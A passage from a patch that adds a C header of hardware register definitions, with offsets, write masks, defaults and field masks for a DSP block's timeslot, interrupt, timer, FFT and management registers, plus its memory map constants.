+#define CRI_TX_TSLOT0_DEFAULT  (0x3E0FFFFF)
+#define CRI_TX_TSLOT0_FMASK    (0x3E0FFFFF)
+#define CRI_TX_TSLOT1          CRI_GLOBAL(0x0020)
+#define CRI_TX_TSLOT1_WMASK    (0x3E0FFFFF)
+#define CRI_TX_TSLOT1_MASK     (0x3E0FFFFF)
+#define CRI_TX_TSLOT1_DEFAULT  (0x3E0FFFFF)
+#define CRI_TX_TSLOT1_FMASK    (0x3E0FFFFF)
+#define CRI_RX_TSLOTC_A        CRI_GLOBAL(0x0024)
+#define CRI_RX_TSLOTC_A_WMASK  (0x0000)
+#define CRI_RX_TSLOTC_A_MASK   (0x3E0FFFFF)
+#define CRI_RX_TSLOTC_A_DEFAULT (0x3E0FFFFF)
+#define CRI_RX_TSLOTC_A_FMASK  (0x0000)
+#define CRI_RX_TSLOTC_B        CRI_GLOBAL(0x0028)
+#define CRI_RX_TSLOTC_B_WMASK  (0x0000)
+#define CRI_RX_TSLOTC_B_MASK   (0x3E0FFFFF)
+#define CRI_RX_TSLOTC_B_DEFAULT (0x3E0FFFFF)
+#define CRI_RX_TSLOTC_B_FMASK  (0x0000)
+#define CRI_RX_TSLOT0          CRI_GLOBAL(0x002C)
+#define CRI_RX_TSLOT0_WMASK    (0x3E0FFFFF)
+#define CRI_RX_TSLOT0_MASK     (0x3E0FFFFF)
+#define CRI_RX_TSLOT0_DEFAULT  (0x3E0FFFFF)
+#define CRI_RX_TSLOT0_FMASK    (0x3E0FFFFF)
+#define CRI_RX_TSLOT1          CRI_GLOBAL(0x0030)
+#define CRI_RX_TSLOT1_WMASK    (0x3E0FFFFF)
+#define CRI_RX_TSLOT1_MASK     (0x3E0FFFFF)
+#define CRI_RX_TSLOT1_DEFAULT  (0x3E0FFFFF)
+#define CRI_RX_TSLOT1_FMASK    (0x3E0FFFFF)
+#define CRI_TX_ATSLOTC_A       CRI_GLOBAL(0x0034)
+#define CRI_TX_ATSLOTC_A_WMASK (0x0000)
+#define CRI_TX_ATSLOTC_A_MASK  (0x3E000000)
+#define CRI_TX_ATSLOTC_A_DEFAULT (0x3E000000)
+#define CRI_TX_ATSLOTC_A_FMASK (0x0000)
+#define CRI_TX_ATSLOTC_B       CRI_GLOBAL(0x0038)
+#define CRI_TX_ATSLOTC_B_WMASK (0x0000)
+#define CRI_TX_ATSLOTC_B_MASK  (0x3E000000)
+#define CRI_TX_ATSLOTC_B_DEFAULT (0x3E000000)
+#define CRI_TX_ATSLOTC_B_FMASK (0x0000)
+#define CRI_TX_ATSLOT0         CRI_GLOBAL(0x003C)
+#define CRI_TX_ATSLOT0_WMASK   (0x3E000000)
+#define CRI_TX_ATSLOT0_MASK    (0x3E000000)
+#define CRI_TX_ATSLOT0_DEFAULT (0x3E000000)
+#define CRI_TX_ATSLOT0_FMASK   (0x3E000000)
+#define CRI_TX_ATSLOT1         CRI_GLOBAL(0x0040)
+#define CRI_TX_ATSLOT1_WMASK   (0x3E000000)
+#define CRI_TX_ATSLOT1_MASK    (0x3E000000)
+#define CRI_TX_ATSLOT1_DEFAULT (0x3E000000)
+#define CRI_TX_ATSLOT1_FMASK   (0x3E000000)
+#define CRI_RX_ATSLOTC_A       CRI_GLOBAL(0x0044)
+#define CRI_RX_ATSLOTC_A_WMASK (0x0000)
+#define CRI_RX_ATSLOTC_A_MASK  (0x3E000000)
+#define CRI_RX_ATSLOTC_A_DEFAULT (0x3E000000)
+#define CRI_RX_ATSLOTC_A_FMASK (0x0000)
+#define CRI_RX_ATSLOTC_B       CRI_GLOBAL(0x0048)
+#define CRI_RX_ATSLOTC_B_WMASK (0x0000)
+#define CRI_RX_ATSLOTC_B_MASK  (0x3E000000)
+#define CRI_RX_ATSLOTC_B_DEFAULT (0x3E000000)
+#define CRI_RX_ATSLOTC_B_FMASK (0x0000)
+#define CRI_RX_ATSLOT0         CRI_GLOBAL(0x004C)
+#define CRI_RX_ATSLOT0_WMASK   (0x3E000000)
+#define CRI_RX_ATSLOT0_MASK    (0x3E000000)
+#define CRI_RX_ATSLOT0_DEFAULT (0x3E000000)
+#define CRI_RX_ATSLOT0_FMASK   (0x3E000000)
+#define CRI_RX_ATSLOT1         CRI_GLOBAL(0x0050)
+#define CRI_RX_ATSLOT1_WMASK   (0x3E000000)
+#define CRI_RX_ATSLOT1_MASK    (0x3E000000)
+#define CRI_RX_ATSLOT1_DEFAULT (0x3E000000)
+#define CRI_RX_ATSLOT1_FMASK   (0x3E000000)
+#define CRI_RXGP0_CTL          CRI_GLOBAL(0x0054)
+#define CRI_RXGP0_CTL_WMASK    (0x000F)
+#define CRI_RXGP0_CTL_MASK     (0x000F)
+#define CRI_RXGP0_CTL_DEFAULT  (0x0000)
+#define CRI_RXGP0_CTL_FMASK    (0x000F)
+#define CRI_RXGP1_CTL          CRI_GLOBAL(0x0058)
+#define CRI_RXGP1_CTL_WMASK    (0x000F)
+#define CRI_RXGP1_CTL_MASK     (0x000F)
+#define CRI_RXGP1_CTL_DEFAULT  (0x0000)
+#define CRI_RXGP1_CTL_FMASK    (0x000F)
+#define CRI_TXGP0_CTL          CRI_GLOBAL(0x005C)
+#define CRI_TXGP0_CTL_WMASK    (0x000F)
+#define CRI_TXGP0_CTL_MASK     (0x000F)
+#define CRI_TXGP0_CTL_DEFAULT  (0x0000)
+#define CRI_TXGP0_CTL_FMASK    (0x000F)
+#define CRI_TXGP1_CTL          CRI_GLOBAL(0x0060)
+#define CRI_TXGP1_CTL_WMASK    (0x000F)
+#define CRI_TXGP1_CTL_MASK     (0x000F)
+#define CRI_TXGP1_CTL_DEFAULT  (0x0000)
+#define CRI_TXGP1_CTL_FMASK    (0x000F)
+#define CRI_RXGP0_VAL          CRI_GLOBAL(0x0064)
+#define CRI_RXGP0_VAL_WMASK    (0xFFFFF)
+#define CRI_RXGP0_VAL_MASK     (0xFFFFF)
+#define CRI_RXGP0_VAL_DEFAULT  (0x0000)
+#define CRI_RXGP0_VAL_FMASK    (0xFFFFF)
+#define CRI_RXGP1_VAL          CRI_GLOBAL(0x0068)
+#define CRI_RXGP1_VAL_WMASK    (0xFFFFF)
+#define CRI_RXGP1_VAL_MASK     (0xFFFFF)
+#define CRI_RXGP1_VAL_DEFAULT  (0x0000)
+#define CRI_RXGP1_VAL_FMASK    (0xFFFFF)
+#define CRI_TXGP0_MCNT         CRI_GLOBAL(0x006C)
+#define CRI_TXGP0_MCNT_WMASK   (0xFFFFF)
+#define CRI_TXGP0_MCNT_MASK    (0xFFFFF)
+#define CRI_TXGP0_MCNT_DEFAULT (0x0000)
+#define CRI_TXGP0_MCNT_FMASK   (0xFFFFF)
+#define CRI_TXGP1_MCNT         CRI_GLOBAL(0x0070)
+#define CRI_TXGP1_MCNT_WMASK   (0xFFFFF)
+#define CRI_TXGP1_MCNT_MASK    (0xFFFFF)
+#define CRI_TXGP1_MCNT_DEFAULT (0x0000)
+#define CRI_TXGP1_MCNT_FMASK   (0xFFFFF)
+#define CRI_MASK0_TX           CRI_GLOBAL(0x0074)
+#define CRI_MASK0_TX_WMASK     (0x37F80050)
+#define CRI_MASK0_TX_MASK      (0x37F80050)
+#define CRI_MASK0_TX_DEFAULT   (0x0000)
+#define CRI_MASK0_TX_FMASK     (0x37F80050)
+#define CRI_MASK0_RX           CRI_GLOBAL(0x0078)
+#define CRI_MASK0_RX_WMASK     (0xC807FFAF)
+#define CRI_MASK0_RX_MASK      (0xC807FFAF)
+#define CRI_MASK0_RX_DEFAULT   (0x0000)
+#define CRI_MASK0_RX_FMASK     (0xC807FFAF)
+#define CRI_MASK1_TX           CRI_GLOBAL(0x007C)
+#define CRI_MASK1_TX_WMASK     (0x37F80050)
+#define CRI_MASK1_TX_MASK      (0x37F80050)
+#define CRI_MASK1_TX_DEFAULT   (0x0000)
+#define CRI_MASK1_TX_FMASK     (0x37F80050)
+#define CRI_MASK1_RX           CRI_GLOBAL(0x0080)
+#define CRI_MASK1_RX_WMASK     (0xC807FFAF)
+#define CRI_MASK1_RX_MASK      (0xC807FFAF)
+#define CRI_MASK1_RX_DEFAULT   (0x0000)
+#define CRI_MASK1_RX_FMASK     (0xC807FFAF)
+#define CRI_STATUS0            CRI_GLOBAL(0x0084)
+#define CRI_STATUS0_WMASK      (0xFFFFFFFF)
+#define CRI_STATUS0_MASK       (0xFFFFFFFF)
+#define CRI_STATUS0_DEFAULT    (0x0000)
+#define CRI_STATUS0_FMASK      (0x0000)
+#define CRI_STATUS1            CRI_GLOBAL(0x0088)
+#define CRI_STATUS1_WMASK      (0xFFFFFFFF)
+#define CRI_STATUS1_MASK       (0xFFFFFFFF)
+#define CRI_STATUS1_DEFAULT    (0x0000)
+#define CRI_STATUS1_FMASK      (0x0000)
+#define CRI_AMASK0_TX          CRI_GLOBAL(0x008C)
+#define CRI_AMASK0_TX_WMASK    (0x0000)
+#define CRI_AMASK0_TX_MASK     (0x0000)
+#define CRI_AMASK0_TX_DEFAULT  (0x0000)
+#define CRI_AMASK0_TX_FMASK    (0x0000)
+#define CRI_AMASK0_RX          CRI_GLOBAL(0x0090)
+#define CRI_AMASK0_RX_WMASK    (0x0000)
+#define CRI_AMASK0_RX_MASK     (0x0000)
+#define CRI_AMASK0_RX_DEFAULT  (0x0000)
+#define CRI_AMASK0_RX_FMASK    (0x0000)
+#define CRI_AMASK1_TX          CRI_GLOBAL(0x0094)
+#define CRI_AMASK1_TX_WMASK    (0x0000)
+#define CRI_AMASK1_TX_MASK     (0x0000)
+#define CRI_AMASK1_TX_DEFAULT  (0x0000)
+#define CRI_AMASK1_TX_FMASK    (0x0000)
+#define CRI_AMASK1_RX          CRI_GLOBAL(0x0098)
+#define CRI_AMASK1_RX_WMASK    (0x0000)
+#define CRI_AMASK1_RX_MASK     (0x0000)
+#define CRI_AMASK1_RX_DEFAULT  (0x0000)
+#define CRI_AMASK1_RX_FMASK    (0x0000)
+#define CRI_UPDCTL             CRI_GLOBAL(0x009C)
+#define CRI_UPDCTL_WMASK       (0xA000)
+#define CRI_UPDCTL_MASK        (0xF1FE)
+#define CRI_UPDCTL_DEFAULT     (0x0000)
+#define CRI_UPDCTL_FMASK       (0xA000)
+#define CRI_EVENT              CRI_GLOBAL(0x00A0)
+#define CRI_EVENT_WMASK        (0xFFFFFFFF)
+#define CRI_EVENT_MASK         (0xFFFFFFFF)
+#define CRI_EVENT_DEFAULT      (0x0000)
+#define CRI_EVENT_FMASK        (0x0000)
+#define CRI_TX_TIMER           CRI_GLOBAL(0x00A4)
+#define CRI_TX_TIMER_WMASK     (0xFFFFF)
+#define CRI_TX_TIMER_MASK      (0xFFFFF)
+#define CRI_TX_TIMER_DEFAULT   (0x0000)
+#define CRI_TX_TIMER_FMASK     (0xFFFFF)
+#define CRI_TX_TIMER_CTL       CRI_GLOBAL(0x00A8)
+#define CRI_TX_TIMER_CTL_WMASK (0x106FFFFF)
+#define CRI_TX_TIMER_CTL_MASK  (0x107FFFFF)
+#define CRI_TX_TIMER_CTL_DEFAULT (0x0000)
+#define CRI_TX_TIMER_CTL_FMASK (0x106FFFFF)
+#define CRI_RX_TIMER           CRI_GLOBAL(0x00AC)
+#define CRI_RX_TIMER_WMASK     (0xFFFFF)
+#define CRI_RX_TIMER_MASK      (0xFFFFF)
+#define CRI_RX_TIMER_DEFAULT   (0x0000)
+#define CRI_RX_TIMER_FMASK     (0xFFFFF)
+#define CRI_RX_TIMER_CTL       CRI_GLOBAL(0x00B0)
+#define CRI_RX_TIMER_CTL_WMASK (0x106FFFFF)
+#define CRI_RX_TIMER_CTL_MASK  (0x107FFFFF)
+#define CRI_RX_TIMER_CTL_DEFAULT (0x0000)
+#define CRI_RX_TIMER_CTL_FMASK (0x106FFFFF)
+#define CRI_TX_PMS_CTL         CRI_GLOBAL(0x00B4)
+#define CRI_TX_PMS_CTL_WMASK   (0x7FFFFF)
+#define CRI_TX_PMS_CTL_MASK    (0xFFFFFF)
+#define CRI_TX_PMS_CTL_DEFAULT (0x0000)
+#define CRI_TX_PMS_CTL_FMASK   (0x7FFFFF)
+#define CRI_TX_QTP_CTL         CRI_GLOBAL(0x00B8)
+#define CRI_TX_QTP_CTL_WMASK   (0x7FFFFF)
+#define CRI_TX_QTP_CTL_MASK    (0xFFFFFF)
+#define CRI_TX_QTP_CTL_DEFAULT (0x0000)
+#define CRI_TX_QTP_CTL_FMASK   (0x7FFFFF)
+#define CRI_TX_QT_CTL          CRI_GLOBAL(0x00BC)
+#define CRI_TX_QT_CTL_WMASK    (0x7FFFFF)
+#define CRI_TX_QT_CTL_MASK     (0xFFFFFF)
+#define CRI_TX_QT_CTL_DEFAULT  (0x0000)
+#define CRI_TX_QT_CTL_FMASK    (0x7FFFFF)
+#define CRI_TX_IFFT_CTL        CRI_GLOBAL(0x00C0)
+#define CRI_TX_IFFT_CTL_WMASK  (0x7FFFFF)
+#define CRI_TX_IFFT_CTL_MASK   (0xFFFFFF)
+#define CRI_TX_IFFT_CTL_DEFAULT (0x0000)
+#define CRI_TX_IFFT_CTL_FMASK  (0x7FFFFF)
+#define CRI_RX_FFT_CTL         CRI_GLOBAL(0x00C4)
+#define CRI_RX_FFT_CTL_WMASK   (0x7FFFFF)
+#define CRI_RX_FFT_CTL_MASK    (0xFFFFFF)
+#define CRI_RX_FFT_CTL_DEFAULT (0x0000)
+#define CRI_RX_FFT_CTL_FMASK   (0x7FFFFF)
+#define CRI_RX_QT_CTL          CRI_GLOBAL(0x00C8)
+#define CRI_RX_QT_CTL_WMASK    (0x7FFFFF)
+#define CRI_RX_QT_CTL_MASK     (0xFFFFFF)
+#define CRI_RX_QT_CTL_DEFAULT  (0x0000)
+#define CRI_RX_QT_CTL_FMASK    (0x7FFFFF)
+#define CRI_RX_QTP_CTL         CRI_GLOBAL(0x00CC)
+#define CRI_RX_QTP_CTL_WMASK   (0x7FFFFF)
+#define CRI_RX_QTP_CTL_MASK    (0xFFFFFF)
+#define CRI_RX_QTP_CTL_DEFAULT (0x0000)
+#define CRI_RX_QTP_CTL_FMASK   (0x7FFFFF)
+#define CRI_RX_PMS_CTL         CRI_GLOBAL(0x00D0)
+#define CRI_RX_PMS_CTL_WMASK   (0x7FFFFF)
+#define CRI_RX_PMS_CTL_MASK    (0xFFFFFF)
+#define CRI_RX_PMS_CTL_DEFAULT (0x0000)
+#define CRI_RX_PMS_CTL_FMASK   (0x7FFFFF)
+#define CRI_TX_QT_STALL        CRI_GLOBAL(0x00D4)
+#define CRI_TX_QT_STALL_WMASK  (0x3FFFF)
+#define CRI_TX_QT_STALL_MASK   (0xFFFFF)
+#define CRI_TX_QT_STALL_DEFAULT (0x40000)
+#define CRI_TX_QT_STALL_FMASK  (0x1FFFF)
+#define CRI_RX_QT_STALL        CRI_GLOBAL(0x00D8)
+#define CRI_RX_QT_STALL_WMASK  (0x3FFFF)
+#define CRI_RX_QT_STALL_MASK   (0xFFFFF)
+#define CRI_RX_QT_STALL_DEFAULT (0x40000)
+#define CRI_RX_QT_STALL_FMASK  (0x1FFFF)
+#define CRI_RX_FFT_STALL_CTL   CRI_GLOBAL(0x00DC)
+#define CRI_RX_FFT_STALL_CTL_WMASK (0x3FFFFF)
+#define CRI_RX_FFT_STALL_CTL_MASK (0xBFFFFF)
+#define CRI_RX_FFT_STALL_CTL_DEFAULT (0x0000)
+#define CRI_RX_FFT_STALL_CTL_FMASK (0x3FFFFF)
+#define CRI_NTR_CPE_CTRL       CRI_GLOBAL(0x00E0)
+#define CRI_NTR_CPE_CTRL_WMASK (0x7FFFF)
+#define CRI_NTR_CPE_CTRL_MASK  (0x8007FFFF)
+#define CRI_NTR_CPE_CTRL_DEFAULT (0x8A00)
+#define CRI_NTR_CPE_CTRL_FMASK (0x7FFFF)
+#define CRI_NTRSRCFR           CRI_GLOBAL(0x00E4)
+#define CRI_NTRSRCFR_WMASK     (0xFFFFF)
+#define CRI_NTRSRCFR_MASK      (0xFFFFF)
+#define CRI_NTRSRCFR_DEFAULT   (0x137A7)
+#define CRI_NTRSRCFR_FMASK     (0xFFFFF)
+#define CRI_NTRPHASE           CRI_GLOBAL(0x00E8)
+#define CRI_NTRPHASE_WMASK     (0x0000)
+#define CRI_NTRPHASE_MASK      (0x1FFFF)
+#define CRI_NTRPHASE_DEFAULT   (0x0000)
+#define CRI_NTRPHASE_FMASK     (0x1FFFF)
+#define CRI_NTR_CO_CTRL        CRI_GLOBAL(0x00EC)
+#define CRI_NTR_CO_CTRL_WMASK  (0x3FFFC000)
+#define CRI_NTR_CO_CTRL_MASK   (0xBFFFC3FF)
+#define CRI_NTR_CO_CTRL_DEFAULT (0x0000)
+#define CRI_NTR_CO_CTRL_FMASK  (0x3FFFC2FF)
+#define CRI_NTR_CO_PERP_NUM    CRI_GLOBAL(0x00F0)
+#define CRI_NTR_CO_PERP_NUM_WMASK (0xFFFFFFFF)
+#define CRI_NTR_CO_PERP_NUM_MASK (0xFFFFFFFF)
+#define CRI_NTR_CO_PERP_NUM_DEFAULT (0x0000)
+#define CRI_NTR_CO_PERP_NUM_FMASK (0xFFFFFFFF)
+#define CRI_NTR_CO_PERP_DENOM  CRI_GLOBAL(0x00F4)
+#define CRI_NTR_CO_PERP_DENOM_WMASK (0xFFFFFFFF)
+#define CRI_NTR_CO_PERP_DENOM_MASK (0xFFFFFFFF)
+#define CRI_NTR_CO_PERP_DENOM_DEFAULT (0x0000)
+#define CRI_NTR_CO_PERP_DENOM_FMASK (0xFFFFFFFF)
+#define CRI_FCIMASK2_TX        CRI_GLOBAL(0x00F8)
+#define CRI_FCIMASK2_TX_WMASK  (0x37F80050)
+#define CRI_FCIMASK2_TX_MASK   (0x37F80050)
+#define CRI_FCIMASK2_TX_DEFAULT (0x0000)
+#define CRI_FCIMASK2_TX_FMASK  (0x37F80050)
+#define CRI_FCIMASK2_RX        CRI_GLOBAL(0x00FC)
+#define CRI_FCIMASK2_RX_WMASK  (0xC807FFAF)
+#define CRI_FCIMASK2_RX_MASK   (0xC807FFAF)
+#define CRI_FCIMASK2_RX_DEFAULT (0x0000)
+#define CRI_FCIMASK2_RX_FMASK  (0xC807FFAF)
+#define CRI_FCIMASK3_TX        CRI_GLOBAL(0x0100)
+#define CRI_FCIMASK3_TX_WMASK  (0x37F80050)
+#define CRI_FCIMASK3_TX_MASK   (0x37F80050)
+#define CRI_FCIMASK3_TX_DEFAULT (0x0000)
+#define CRI_FCIMASK3_TX_FMASK  (0x37F80050)
+#define CRI_FCIMASK3_RX        CRI_GLOBAL(0x0104)
+#define CRI_FCIMASK3_RX_WMASK  (0xC807FFAF)
+#define CRI_FCIMASK3_RX_MASK   (0xC807FFAF)
+#define CRI_FCIMASK3_RX_DEFAULT (0x0000)
+#define CRI_FCIMASK3_RX_FMASK  (0xC807FFAF)
+#define CRI_FCISTATUS2         CRI_GLOBAL(0x0108)
+#define CRI_FCISTATUS2_WMASK   (0xFFFFFFFF)
+#define CRI_FCISTATUS2_MASK    (0xFFFFFFFF)
+#define CRI_FCISTATUS2_DEFAULT (0x0000)
+#define CRI_FCISTATUS2_FMASK   (0x0000)
+#define CRI_FCISTATUS3         CRI_GLOBAL(0x010C)
+#define CRI_FCISTATUS3_WMASK   (0xFFFFFFFF)
+#define CRI_FCISTATUS3_MASK    (0xFFFFFFFF)
+#define CRI_FCISTATUS3_DEFAULT (0x0000)
+#define CRI_FCISTATUS3_FMASK   (0x0000)
+
+/* Dsp Memory Address Constants */ 
+#define dsp_iram_base          (0x0000)
+#define dsp_iram_mask          (0xFFFFFFFF)
+#define dsp_iram_size          (0x9800)
+#define dsp_iram_default       (0x0000)
+#define dsp_dccm_base          (0x10000)
+#define dsp_dccm_mask          (0xFFFFFFFF)
+#define dsp_dccm_size          (0x4000)
+#define dsp_dccm_default       (0x0000)
+#define dsp_ldstreg_base       (0x20000)
+#define dsp_ldstreg_mask       (0xFFFFFFFF)
+#define dsp_ldstreg_size       (0x0200)
+#define dsp_ldstreg_default    (0x0000)
+#define dsp_xram_base          (0x30000)
+#define dsp_xram_mask          (0xFFFFFFFF)
+#define dsp_xram_size          (0x1000)
+#define dsp_xram_default       (0x0000)
+#define dsp_yram_base          (0x34000)
+#define dsp_yram_mask          (0xFFFFFFFF)
+#define dsp_yram_size          (0x1000)
+#define dsp_yram_default       (0x0000)
+#define dsp_iibram_base        (0x40000)
+#define dsp_iibram_mask        (0xFFFFFFFF)
+#define dsp_iibram_size        (0x2A000)
+#define dsp_iibram_default     (0x0000)
+#define dsp_sdram_base         (0x80000)
+#define dsp_sdram_mask         (0xFFFFFFFF)
+#define dsp_sdram_size         (0x180000)
+#define dsp_sdram_default      (0x0000)
+
+/* Dsp Mgmt Address Constants */ 
+#define dsp_mgmt_reg_base      (0x0000)
+#define DSP_MGMT_REG(r)        (int)(dsp_mgmt_reg_base + (r))
+#define dsp_mgmt_reg_size      (0x0080)
+
+#define ME_VERSION             DSP_MGMT_REG(0x0000)
+#define ME_VERSION_WMASK       (0x0000)
+#define ME_VERSION_MASK        (0x0FFF)
+#define ME_VERSION_DEFAULT     (0x0230)
+#define ME_VERSION_FMASK       (0x0FFF)
+#define ME_ARC2ME_STAT         DSP_MGMT_REG(0x0004)
+#define ME_ARC2ME_STAT_WMASK   (0x0037)
+#define ME_ARC2ME_STAT_MASK    (0x0037)
+#define ME_ARC2ME_STAT_DEFAULT (0x0000)
+#define ME_ARC2ME_STAT_FMASK   (0x0000)
+#define ME_ARC2ME_MASK         DSP_MGMT_REG(0x0008)
+#define ME_ARC2ME_MASK_WMASK   (0x0037)
+#define ME_ARC2ME_MASK_MASK    (0x0037)
+#define ME_ARC2ME_MASK_DEFAULT (0x0000)
+#define ME_ARC2ME_MASK_FMASK   (0x0037)
+#define ME_ME2ARC_INT          DSP_MGMT_REG(0x000C)
+#define ME_ME2ARC_INT_WMASK    (0x0007)
+#define ME_ME2ARC_INT_MASK     (0x0007)
+#define ME_ME2ARC_INT_DEFAULT  (0x0000)
+#define ME_ME2ARC_INT_FMASK    (0x0007)
+#define ME_ME2ARC_STAT         DSP_MGMT_REG(0x0010)
+#define ME_ME2ARC_STAT_WMASK   (0x0000)
+#define ME_ME2ARC_STAT_MASK    (0x0007)
+#define ME_ME2ARC_STAT_DEFAULT (0x0000)
+#define ME_ME2ARC_STAT_FMASK   (0x0007)
+#define ME_CLK_CTRL            DSP_MGMT_REG(0x0014)
+#define ME_CLK_CTRL_WMASK      (0x0001)
+#define ME_CLK_CTRL_MASK       (0x0001)
+#define ME_CLK_CTRL_DEFAULT    (0x0001)
+#define ME_CLK_CTRL_FMASK      (0x0001)
+#define ME_RST_CTRL            DSP_MGMT_REG(0x0018)
+#define ME_RST_CTRL_WMASK      (0x0007)
+#define ME_RST_CTRL_MASK       (0x0007)
+#define ME_RST_CTRL_DEFAULT    (0x0000)
+#define ME_RST_CTRL_FMASK      (0x0007)
+#define ME_CHIP_CONFIG         DSP_MGMT_REG(0x001C)
+#define ME_CHIP_CONFIG_WMASK   (0x0001)
+#define ME_CHIP_CONFIG_MASK    (0x0001)
+#define ME_CHIP_CONFIG_DEFAULT (0x0000)
+#define ME_CHIP_CONFIG_FMASK   (0x0001)
+#define ME_DBG_MASTER          DSP_MGMT_REG(0x0020)
+#define ME_DBG_MASTER_WMASK    (0x0001)
+#define ME_DBG_MASTER_MASK     (0x0001)
+#define ME_DBG_MASTER_DEFAULT  (0x0000)
+#define ME_DBG_MASTER_FMASK    (0x0001)
+#define ME_DBG_DECODE          DSP_MGMT_REG(0x0024)
+#define ME_DBG_DECODE_WMASK    (0x0003)
+#define ME_DBG_DECODE_MASK     (0x0003)
+#define ME_DBG_DECODE_DEFAULT  (0x0000)
+#define ME_DBG_DECODE_FMASK    (0x0003)
+#define ME_DBG_PORT_SEL        DSP_MGMT_REG(0x0028)
+#define ME_DBG_PORT_SEL_WMASK  (0x0001)
+#define ME_DBG_PORT_SEL_MASK   (0x0001)
+#define ME_DBG_PORT_SEL_DEFAULT (0x0000)
+#define ME_DBG_PORT_SEL_FMASK  (0x0001)
+#define ME_DBG_RD_AD           DSP_MGMT_REG(0x002C)
+#define ME_DBG_RD_AD_WMASK     (0x3FFFFF)
+#define ME_DBG_RD_AD_MASK      (0x3FFFFF)
+#define ME_DBG_RD_AD_DEFAULT   (0x0000)
+#define ME_DBG_RD_AD_FMASK     (0x3FFFFF)
+#define ME_DBG_WR_AD           DSP_MGMT_REG(0x0030)
+#define ME_DBG_WR_AD_WMASK     (0x3FFFFF)
+#define ME_DBG_WR_AD_MASK      (0x3FFFFF)
+#define ME_DBG_WR_AD_DEFAULT   (0x0000)
+#define ME_DBG_WR_AD_FMASK     (0x3FFFFF)
+#define ME_DBG_DATA            DSP_MGMT_REG(0x0034)
+#define ME_DBG_DATA_WMASK      (0xFFFFFFFF)
+#define ME_DBG_DATA_MASK       (0xFFFFFFFF)
+#define ME_DBG_DATA_DEFAULT    (0x0000)
+#define ME_DBG_DATA_FMASK      (0xFFFFFFFF)
+#define ME_DX_PORT_SEL         DSP_MGMT_REG(0x0038)
+#define ME_DX_PORT_SEL_WMASK   (0x0001)
+#define ME_DX_PORT_SEL_MASK    (0x0001)
+#define ME_DX_PORT_SEL_DEFAULT (0x0000)
+#define ME_DX_PORT_SEL_FMASK   (0x0001)
+#define ME_DX_AD               DSP_MGMT_REG(0x003C)
+#define ME_DX_AD_WMASK         (0x3FFFFC)
+#define ME_DX_AD_MASK          (0x3FFFFF)
+#define ME_DX_AD_DEFAULT       (0x0000)
+#define ME_DX_AD_FMASK         (0x3FFFFF)
+#define ME_DX_DATA             DSP_MGMT_REG(0x0040)
+#define ME_DX_DATA_WMASK       (0xFFFFFFFF)
+#define ME_DX_DATA_MASK        (0xFFFFFFFF)
+#define ME_DX_DATA_DEFAULT     (0x0000)
+#define ME_DX_DATA_FMASK       (0xFFFFFFFF)
+#define ME_DX_STAT             DSP_MGMT_REG(0x0044)
+#define ME_DX_STAT_WMASK       (0x0003)
+#define ME_DX_STAT_MASK        (0x0003)
+#define ME_DX_STAT_DEFAULT     (0x0000)
+#define ME_DX_STAT_FMASK       (0x0000)
+#define ME_DX_MWS              DSP_MGMT_REG(0x0048)
+#define ME_DX_MWS_WMASK        (0x000F)
+#define ME_DX_MWS_MASK         (0x000F)
+#define ME_DX_MWS_DEFAULT      (0x0003)
+#define ME_DX_MWS_FMASK        (0x000F)
+#define ME_ARC_GP_STAT         DSP_MGMT_REG(0x004C)
+#define ME_ARC_GP_STAT_WMASK   (0x0000)
+#define ME_ARC_GP_STAT_MASK    (0xFFFFFFFF)
+#define ME_ARC_GP_STAT_DEFAULT (0x0000)
+#define ME_ARC_GP_STAT_FMASK   (0xFFFFFFFF)
+#define ME_XDATA_BASE_SH       DSP_MGMT_REG(0x0050)
+#define ME_XDATA_BASE_SH_WMASK (0x1FFFFFE0)
+#define ME_XDATA_BASE_SH_MASK  (0x1FFFFFE0)
+#define ME_XDATA_BASE_SH_DEFAULT (0x1FFFFFE0)
+#define ME_XDATA_BASE_SH_FMASK (0x1FFFFFE0)
+#define ME_XDATA_BASE          DSP_MGMT_REG(0x0054)
+#define ME_XDATA_BASE_WMASK    (0x0000)
+#define ME_XDATA_BASE_MASK     (0x1FFFFFE0)
+#define ME_XDATA_BASE_DEFAULT  (0x1FFFFFE0)
+#define ME_XDATA_BASE_FMASK    (0x1FFFFFE0)
+#define ME_XMEM_BAR0           DSP_MGMT_REG(0x0058)
+#define ME_XMEM_BAR0_WMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR0_MASK      (0x1FFFFFE0)
+#define ME_XMEM_BAR0_DEFAULT   (0x1FFFFFE0)
+#define ME_XMEM_BAR0_FMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR1           DSP_MGMT_REG(0x005C)
+#define ME_XMEM_BAR1_WMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR1_MASK      (0x1FFFFFE0)
+#define ME_XMEM_BAR1_DEFAULT   (0x1FFFFFE0)
+#define ME_XMEM_BAR1_FMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR2           DSP_MGMT_REG(0x0060)
+#define ME_XMEM_BAR2_WMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR2_MASK      (0x1FFFFFE0)
+#define ME_XMEM_BAR2_DEFAULT   (0x1FFFFFE0)
+#define ME_XMEM_BAR2_FMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR3           DSP_MGMT_REG(0x0064)
+#define ME_XMEM_BAR3_WMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR3_MASK      (0x1FFFFFE0)
+#define ME_XMEM_BAR3_DEFAULT   (0x1FFFFFE0)
+#define ME_XMEM_BAR3_FMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR4           DSP_MGMT_REG(0x0068)
+#define ME_XMEM_BAR4_WMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR4_MASK      (0x1FFFFFE0)
+#define ME_XMEM_BAR4_DEFAULT   (0x1FFFFFE0)
+#define ME_XMEM_BAR4_FMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR5           DSP_MGMT_REG(0x006C)
+#define ME_XMEM_BAR5_WMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR5_MASK      (0x1FFFFFE0)
+#define ME_XMEM_BAR5_DEFAULT   (0x1FFFFFE0)
+#define ME_XMEM_BAR5_FMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR6           DSP_MGMT_REG(0x0070)
+#define ME_XMEM_BAR6_WMASK     (0x1FFFFFE0)
+#define ME_XMEM_BAR6_MASK      (0x1FFFFFE0)
+#define ME_XMEM_BAR6_DEFAULT   (0x1FFFFFE0)
+#define ME_XMEM_BAR6_FMASK     (0x1FFFFFE0)
